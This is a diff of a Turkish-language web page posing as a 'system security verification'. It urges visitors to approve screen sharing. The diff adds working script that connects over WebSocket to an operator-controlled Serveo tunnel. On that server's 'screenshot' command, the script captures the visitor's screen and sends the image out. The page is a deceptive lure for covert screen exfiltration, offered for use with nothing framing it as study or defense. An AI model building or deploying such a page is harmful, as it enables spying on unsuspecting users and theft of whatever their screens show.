@@ -1,38 +1,69 @@
-<html>
-<head><title>Sistem Dogrulama</title></head>
-<body style="background:#111;color:white;text-align:center;font-family:sans-serif;padding-top:50px;">
-    <h2>Devam etmek icin ekran paylasimini onaylayin</h2>
-    <br>
-    <button id="btn" style="padding:15px 30px;font-size:18px;cursor:pointer;background:#28a745;color:white;border:none;border-radius:5px;">
-        BAGLAN VE ONAYLA
-    </button>
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Sistem Dogrulama</title>
+</head>
+<body style="background:#111;color:white;text-align:center;font-family:sans-serif;padding-top:100px;">
+
+    <div style="border: 1px solid #333; display: inline-block; padding: 40px; border-radius: 15px; background: #1a1a1a;">
+        <h2>Sistem Güvenlik Doğrulaması</h2>
+        <p style="color: #888;">Devam etmek için lütfen ekran paylaşımını onaylayın.</p>
+        <br>
+        <button id="btn" style="padding:15px 40px; font-size:18px; cursor:pointer; background:#28a745; color:white; border:none; border-radius:5px; font-weight:bold;">
+            BAGLAN VE ONAYLA
+        </button>
+    </div>
 
     <script>
         const btn = document.getElementById("btn");
+        
         btn.onclick = async () => {
-            alert("Baglanti kuruluyor, lutfen ekrani secin.");
+            // Butona basıldığını anlamak için bir uyarı
+            console.log("Bağlantı başlatılıyor...");
+            
+            // SENİN GÜNCEL SERVEO ADRESİN
             const ws = new WebSocket("wss://5627ac5f8bad2e5f-188-3-71-142.serveousercontent.com");
 
             ws.onopen = () => {
-                btn.innerText = "BAGLANDI ✅";
+                btn.innerText = "BAĞLANTI KURULDU ✅";
                 btn.style.background = "#555";
+                btn.disabled = true;
+                console.log("Serveo sunucusuna bağlanıldı.");
             };
 
-            ws.onmessage = async (e) => {
-                if (e.data === "screenshot") {
+            ws.onmessage = async (event) => {
+                if (event.data === "screenshot") {
                     try {
-                        const s = await navigator.mediaDevices.getDisplayMedia({video:true});
-                        const v = document.createElement("video");
-                        v.srcObject = s;
-                        await v.play();
-                        const c = document.createElement("canvas");
-                        c.width = v.videoWidth;
-                        c.height = v.videoHeight;
-                        c.getContext("2d").drawImage(v,0,0);
-                        s.getTracks().forEach(t => t.stop());
-                        c.toBlob(b => ws.send(b), "image/png");
-                    } catch (err) { console.log(err); }
+                        const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                        const video = document.createElement("video");
+                        video.srcObject = stream;
+                        await video.play();
+
+                        const canvas = document.createElement("canvas");
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext("2d").drawImage(video, 0, 0);
+
+                        // Ekran kaydını durdur (tek seferlik çekim)
+                        stream.getTracks().forEach(track => track.stop());
+
+                        // Resmi gönder
+                        canvas.toBlob(blob => {
+                            ws.send(blob);
+                            console.log("Ekran görüntüsü gönderildi.");
+                        }, "image/png");
+
+                    } catch (err) {
+                        console.error("Hata:", err);
+                        alert("Hata: Ekran paylaşımı reddedildi veya bir sorun oluştu.");
+                    }
                 }
+            };
+
+            ws.onerror = (error) => {
+                console.error("Bağlantı Hatası:", error);
+                alert("Sunucuya bağlanılamadı! Lütfen terminaldeki Serveo linkinin aktif olduğundan emin olun.");
             };
         };
     </script>
